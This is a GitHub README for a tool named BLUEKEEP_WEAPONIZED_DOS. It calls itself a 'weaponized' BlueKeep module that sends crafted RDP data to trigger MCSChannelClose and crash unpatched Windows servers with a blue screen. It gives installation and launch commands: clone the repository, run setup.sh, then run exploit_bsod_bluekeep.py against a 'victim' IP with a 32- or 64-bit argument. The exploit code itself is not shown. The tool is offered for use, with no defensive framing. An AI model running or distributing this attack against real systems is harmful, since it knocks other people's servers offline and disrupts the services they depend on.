# BLUEKEEP_WEAPONIZED_DOS

<p><b>
  This is a weaponized Bluekeep module, that will cause an unpatched server , to crash or worse , Cause a BSOD. 
  his module works by sending crafted data required to trigger the call to MCSChannelClose.
  This causes prematurely closing an internal channel, which results in a BSOD on the victim machine.
  
</p></b>

<p><b>
Installation instructions : 
  
  <p><b>git clone https://github.com/1captainnemo1/BLUEKEEP_WEAPONIZED_DOS.git</p></b>
  <p><b>cd BLUEKEEP_WEAPONIZED_DOS/</p></b>
  <p><b>chmod +x setup.sh</p></b>
  <p><b>./setup.sh    # to clone the impackets module </p></b>
  <p><b>python exploit_bsod_bluekeep.py "IP" 64</p></b>
  <p><b>or</p></b>
  <p><b>python exploit_bsod_bluekeep.py "IP" 32 </p></b>
  <p><b>depending on the victim machine architecture </p></b>
  
  
</p></b>

<p><b>#Author :#Captain_Nemo </p></b>

<p>
  <a href= "https://youtu.be/oUKoKYMpXRE" rel="nofollow">
      <img src="https://github.com/1captainnemo1/BLUEKEEP_WEAPONIZED_DOS/blob/master/bluekeepweapon.jpg?raw=true"  alt="to_video" style="max-width:100%;">
  </a>
</p>
